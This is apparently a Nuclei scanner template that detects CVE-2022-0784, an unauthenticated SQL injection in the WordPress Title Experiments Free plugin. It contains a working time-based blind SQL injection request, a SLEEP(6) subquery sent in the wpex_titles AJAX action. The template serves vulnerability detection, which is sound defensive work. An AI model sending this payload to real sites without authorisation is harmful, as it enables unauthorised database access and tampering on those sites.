id: CVE-2022-0784
info:
  name: WordPress Title Experiments Free <9.0.1 - SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Title Experiments Free plugin version <9.0.1 has an SQL
    injection vulnerability which allows attackers to potentially access sensitive
    data, alter data, and carry out unauthorized administrative tasks on the affected
    website via the wpex_titles AJAX action available to unauthenticated users.
  reference:
  - https://wpscan.com/vulnerability/6672b59f-14bc-4a22-9e0b-fcab4e01d97f
  - https://wordpress.org/plugins/wp-experiments-free/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0784
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0784
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The SQL injection vulnerability in WordPress Title Experiments Free plugin
      before 9.0.1 can allow an attacker to execute unauthorized administrative operations,
      obtain sensitive information and modify data on the affected site.
    recommendation: I recommend updating to WordPress Title Experiments Free plugin
      version 9.0.1 or higher to prevent potential SQL injection vulnerabilities.
  tags: cve,wpscan,wp-plugin,wp,sqli,wp-experiments-free,unauth,cve2022,wordpress
requests:
- raw:
  - '@timeout: 10s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(6)))je)

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "text/html")
    - contains(body, "{\"images\":")
    condition: and
